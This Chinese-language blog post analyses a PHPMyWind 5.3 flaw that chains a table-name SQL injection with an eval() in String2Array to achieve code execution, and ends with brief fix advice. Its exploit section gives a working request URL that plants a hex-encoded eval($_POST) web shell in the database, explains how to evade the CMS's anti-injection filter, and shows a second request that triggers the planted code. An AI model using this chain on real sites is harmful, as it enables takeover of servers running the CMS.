---
layout: post
title: phpmywind-v5.3任意代码执行
categories: vulnerability analysis
tags: [vulnerability analysis,0day]
---
**测试环境**

```
wamp+phpmywind-v5.3
```

**0x01漏洞分析**

先看全局文件include\common.inc.php

```
//检查外部传递的值并转义
function _RunMagicQuotes(&$svar)
{
	//PHP5.4已经将此函数移除
    if(@!get_magic_quotes_gpc())
    {
        if(is_array($svar))
        {
            foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);
        }
        else
        {
            if(strlen($svar)>0 &&
			   preg_match('#^(cfg_|GLOBALS|_GET|_POST|_SESSION|_COOKIE)#',$svar))
            {
				exit('不允许请求的变量值!');
            }

            $svar = addslashes($svar);
        }
    }
    return $svar;
}


//直接应用变量名称替代
foreach(array('_GET','_POST') as $_request)
{
	foreach($$_request as $_k => $_v)
	{
		if(strlen($_k)>0 &&
		   preg_match('#^(GLOBALS|_GET|_POST|_SESSION|_COOKIE)#',$_k))
		{
			exit('不允许请求的变量名!');
		}

		${$_k} = _RunMagicQuotes($_v);
	}
}

```
这段代码的作用就是做全局的GPC转义以及注册全局变量，类似于一个为register_global。

看到4g.php

```
else if($m == 'show')
{
	require_once(PHPMYWIND_TEMP.'/default/mobile/show.php');
	exit();
}
```

我们继续跟进default/mobile/show.php这个文件,看到以下代码


```
<?php require_once(dirname(__FILE__).'/nav.php'); ?>
		<!-- 栏目内容 -->
		<?php
		$row = $dosql->GetOne("SELECT * FROM `#@__infoclass` WHERE id = $cid AND checkinfo = 'true' ORDER BY orderid ASC");
		if(!empty($row['id']))
		{
		?>
		<div class="pubBox">
			<div class="hd">
				<h2><?php echo $row['classname']; ?></h2>
			</div>
			<div class="ft">
            	<div class="subCont">
				<?php
				switch($row['infotype'])
				{
					case 1:
						$tbname = '#@__infolist';
					break;
					case 2:
						$tbname = '#@__infoimg';
					break;
				}
				//增加一次点击量
				$dosql->ExecNoneQuery("UPDATE `$tbname` SET hits=hits+1 WHERE `id`=$id");
				$row = $dosql->GetOne("SELECT * from `$tbname` WHERE `id`=$id");
				?>
```

值得注意的是```$row['infotype']```的值，如果这个变量的返回值为空的话，那么就会导致不会给```$tbname```这个变量赋值，并且```$tbname```进入了下面的sql语句中，位置就是表名。那我们可以通过控制cid的值，然后使```$row['infotype']```无返回值，进一步为$tbname变量赋值.很显然这里就是一个SQL注入了。

然后看到goodsshow.php文件

```php
<?php

			//检测文档正确性
			$r = $dosql->GetOne("SELECT * FROM `#@__goods` WHERE id=$id");
			if(@$r)
			{
			//增加一次点击量
			$dosql->ExecNoneQuery("UPDATE `#@__goods` SET hits=hits+1 WHERE id=$id");
			$row = $dosql->GetOne("SELECT * FROM `#@__goods` WHERE id=$id");
			?>
			<h1 class="title"><?php echo $row['title']; ?></h1>
			<div class="goodsarea"> 
				<!-- 组图区域开始-->
				<?php
				//判断显示缩略图或组图
				if(!empty($row['picarr']))
				{
					$picarr = unserialize($row['picarr']);
					$picarrBig = explode(',',$picarr[0]);
				?>
				<div class="fl"> <a id="zoompic" class="cloud-zoom" href="<?php echo $picarrBig[0]; ?>" alt="<?php echo $picarrBig[1]; ?>" rel="adjustX:10, adjustY:0"> <img src="<?php echo $picarrBig[0]; ?>" /></a>
					<ul class="zoomlist">
						<?php
						foreach($picarr as $v)
						{
							$picarrSmall = explode(',',$v);
						?>
						<li><a rel="useZoom: 'zoompic', smallImage: '<?php echo $picarrSmall[0]; ?>'" alt="<?php echo $picarrBig[1]; ?>" class="cloud-zoom-gallery" href="<?php echo $picarrSmall[0]; ?>"> <img src="<?php echo $picarrSmall[0]; ?>" /></a></li>
						<?php
						}
						?>
						<div class="cl"></div>
					</ul>
					<div class="cl"></div>
				</div>
				<?php
				}
				else if(!empty($row['picurl']))
				{
				?>
				<div class="fl"> <a id="zoompic" class="cloud-zoom" href="<?php echo $row['picurl']; ?>" rel="adjustX:10, adjustY:0"> <img src="<?php echo $row['picurl']; ?>" /></a>
					<ul class="zoomlist">
						<li><a rel="useZoom: 'zoompic', smallImage: '<?php echo $row['picurl']; ?>' " class="cloud-zoom-gallery" href="<?php echo $row['picurl']; ?>"> <img src="<?php echo $row['picurl']; ?>" /></a></li>
						<div class="cl"></div>
					</ul>
					<div class="cl"></div>
				</div>
				<?php
				}
				?>
				<!-- 组图区域结束 --> 
				<!-- 商品信息开始 -->
				<div class="fr">
					<ul class="tb-meta">
						<li> <span>市场价</span><strong class="lt"><?php echo $row['marketprice']; ?></strong>元 </li>
						<li> <span>促销价</span><strong class="price"><?php echo $row['salesprice']; ?></strong>元 </li>
						<li> <span>浏览数</span><?php echo $row['hits']; ?> 次</li>
						<li> <span>配　送</span><?php if($row['payfreight']==0){echo '买家承担运费';}else{echo '商家承担运费';} ?></li>
					</ul>
					<div class="tb-skin">
						<p class="tb-note-title"><span>请选择您要的商品信息</span><a href="shoppingcart.php" class="end">结算购物车</a></p>
						<form name="gform" id="gform" method="post">
							<dl class="tb-prop">
							<?php

							//将商品属性id与值组成数组
							$rowattr = String2Array($row['attrstr']);
							$row2 = $dosql->Execute('SELECT * FROM `#@__goodsattr` WHERE `goodsid`='.$row['typeid']." AND `checkinfo`=true");
							if($dosql->GetTotalRow() > 0)
							{
								$i = 0;
								while($row2 = $dosql->GetArray())
								{
							?>
								<dt><?php echo $row2['attrname']; ?>：</dt>
								<dd>
									<?php
								if(!empty($rowattr[$row2['id']]))
								{
									echo '<div id="attrdiv_'.$row2['id'].'">';
									$dfvalue = '';
									$rowattrs = explode('|',$rowattr[$row2['id']]);
									foreach($rowattrs as $k=>$v)
									{
										echo '<a href="javascript:;" onclick="SelAttr(this,'.$row2['id'].',\''.$v.'\');"';
										if($k == 0)
										{
											$dfvalue = $v;
											echo 'class="selected"';
										}
										echo '>'.$v.'</a>';
									}
									echo '<input type="hidden" name="attrid_'.$row2['id'].'" id="attrid_'.$row2['id'].'" value="'.$dfvalue.'" />';
									echo '</div>';
								}
								?>
								</dd>
								<?php
									$i++;
								}
							}
							?>
```

我们重点关注一下String2Array函数，可以在\include\commnon.fun.php找到定义

```
if(!function_exists('String2Array'))
{
	function String2Array($data)
	{
		if($data == '') return array();
		@eval("\$array = $data;");
		return $array;
	}
}
``` 

很明显这会造成一个代码执行。我们再次回到上面的代码。```$rowattr = String2Array($row['attrstr']);```其中```$row['attrstr']```是通过```SELECT * FROM `#@__goods` WHERE id=$id```这个语句获取的。如果我们能修改```#@__goods```表里面的attrstr字段值的话，那就可以造成任意代码执行了。刚好可以配合前面的一个SQL注入。这样就能完美发挥这个漏洞了。


**0x02漏洞利用**

由于在这个cms里面存在全局的GPC过滤，所以我们不能使用单引号。这样会转义。因此我们在update的时候可以用十六进制的方法。

第一步我们构造

```
http://127.0.0.1/PHPMyWind_5.3/4g.php?m=show&cid=2&tbname=pmw_goods`  SET attrstr=0x6576616c28245f504f53545b27746f6d61746f275d29 where classid=12  or @`'` %23 and @`'`

```
这个cms有80sec的防注入，所以我们要绕过这个防注入。网上有详细的文章，这里就不复述了。


然后可以看到数据库里

![308065326](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-308065326.png)

这里已经被成功update进去一个一句话木马了。

第二步
访问
http://127.0.0.1/PHPMyWind_5.3/goodsshow.php?cid=12&tid=10&id=1

![2215906991](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2215906991.png)

成功执行代码





**0x03漏洞修复**

初始化```$tanm```,不使用eval函数



